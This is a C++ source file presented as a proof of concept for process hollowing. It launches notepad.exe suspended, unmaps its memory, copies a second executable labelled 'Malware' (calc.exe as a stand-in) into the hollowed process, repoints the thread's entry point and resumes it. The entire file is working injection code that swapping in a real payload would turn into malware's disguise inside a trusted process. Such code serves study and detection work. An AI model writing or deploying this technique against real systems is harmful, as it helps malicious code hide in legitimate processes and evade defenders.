//Author: Alec Wood
//File: ProcHollow.cpp
//Purpose: Proof of concept for Process Hollowing, using target: notepad.exe and malware: calc.exe

#include<Windows.h>
#include<iostream>
#include<stdio.h>
#pragma comment(lib, "ntdll.lib")


int main() {

	//startupInfo and processInfo structures are initialized and will be used to populate CreateProcessA() below.
	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();


	//Create victim process and primary thread in suspended state. 
	if (CreateProcessA(
		(LPSTR)"C:\\Windows\\System32\\notepad.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		startupInfo,
		processInfo) == 0) {
		std::cout << "[*] Process Failed:  " << GetLastError();
		return 1;
	}


	//Use CreateFileA() to open Malware and retrieve location data in file system.
	HANDLE hMalware = CreateFileA(
		(LPCSTR)"C:\\Windows\\System32\\calc.exe",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	std::cout << "[+] PID-> 0x" << processInfo->dwProcessId << std::endl;

	if (hMalware == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to open: " << GetLastError() << std::endl;
		TerminateProcess(processInfo->hProcess, 0);
	}
	std::cout << "[+] Malware file opened." << std::endl;


	//GetFileSize is used to retrieve dwSize of the Malware file.
	DWORD malwareFileSize = GetFileSize(hMalware, 0);
	std::cout << "[+] Malware file size: " << malwareFileSize << " bytes." << std::endl;


	//Dynamically allocates memory for Malware.
	PVOID pMalwareImage = VirtualAlloc(
		NULL,
		malwareFileSize,
		0x3000,
		0x04
	);


	//Will store num of bytes read from ReadFile().
	DWORD numBytesRead;


	//Writes Malware into allocated memory using handle from createProcessA() and writing to
	//the new memory allocation using the pointer from virtualAlloc().
	if (!ReadFile(
		hMalware,
		pMalwareImage,
		malwareFileSize,
		&numBytesRead,
		NULL)) {
		std::cout << "[!] Unable to read. Error: " << GetLastError() << std::endl;
		TerminateProcess(processInfo->hProcess, 0);
		return 1;
	}


	//Close open Malware object handle.
	CloseHandle(hMalware);
	std::cout << "[+] Wrote Malware into memory at: 0x" << pMalwareImage << std::endl;


	CONTEXT c{};


	//Using context structure pointer c to pull thread context for target process.
	c.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(processInfo->hThread, &c);


	//Find base address of Target process
	PVOID pTargetBaseAddress = nullptr;
	ReadProcessMemory(
		processInfo->hProcess,
		(PVOID)(c.Ebx + 8),
		&pTargetBaseAddress,
		sizeof(PVOID),
		0
	);
	std::cout << "[+] Target Base Address : 0x" << pTargetBaseAddress << std::endl;


	//This declaration will be used to hollow the process
	typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);


	//Get handle of ntdll.dll and use to get address of ZwUnmapViewOfSection
	HMODULE hDllBase = GetModuleHandleA("ntdll.dll");
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hDllBase, "ZwUnmapViewOfSection");


	//Free memory in target process to allow for writing of Malware in its place.
	DWORD result = pZwUnmapViewOfSection(processInfo->hProcess, pTargetBaseAddress);
	if (result) {
		std::cout << "[!] Unmap failed." << std::endl;
		TerminateProcess(processInfo->hProcess, 1);
		return 1;
	}

	std::cout << "[+] Process hollowed at Base: 0x" << pTargetBaseAddress << std::endl;


	//Get DOS header from Malware
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMalwareImage;

	//Retrieve NT Header using Malware, the DOS header and e_lfanew(the number of bytes from DOS header to PE header)
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMalwareImage + pDOSHeader->e_lfanew);

	//Retrieve the SizeOfImage from OptionalHeader using the NT Header
	DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;

	std::cout << "[+] Malware Base Address: 0x" << pNTHeaders->OptionalHeader.ImageBase << std::endl;

	
	//Executing VirtualAlloc again but with read/write/execute permissions granted.
	PVOID pHollow = VirtualAllocEx(
		processInfo->hProcess,
		pTargetBaseAddress,
		sizeOfMaliciousImage,
		0x3000,
		0x40
	);
	if (pHollow == NULL) {
		std::cout << "[!] Memory allocation failed. Error: " << GetLastError() << std::endl;
		TerminateProcess(processInfo->hProcess, 0);
		return 1;
	}

	std::cout << "[+] Memory allocated at: 0x" << pHollow << std::endl;


	//write malware headers into target memory
	if (!WriteProcessMemory(
		processInfo->hProcess,
		pTargetBaseAddress,
		pMalwareImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		NULL
	)) {
		std::cout << "[!] Writing Headers failed. Error: " << GetLastError() << std::endl;
	}
	std::cout << "[+] Headers written to memory." << std::endl;


	//write malware sections into target memory
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMalwareImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		WriteProcessMemory(
			processInfo->hProcess,
			(PVOID)((LPBYTE)pHollow + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pMalwareImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			NULL
		);
	}
	std::cout << "[+] Sections written to memory." << std::endl;


	//change EAX value from thread context to the entry point of the Malware process that's been injected.
	//ResumeThread() takes the created process out of the suspended state from createProcess().
	c.Eax = (SIZE_T)((LPBYTE)pHollow + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	SetThreadContext(processInfo->hThread, &c);
	ResumeThread(processInfo->hThread);

	system("pause");
	TerminateProcess(processInfo->hProcess, 0);

	return 0;

}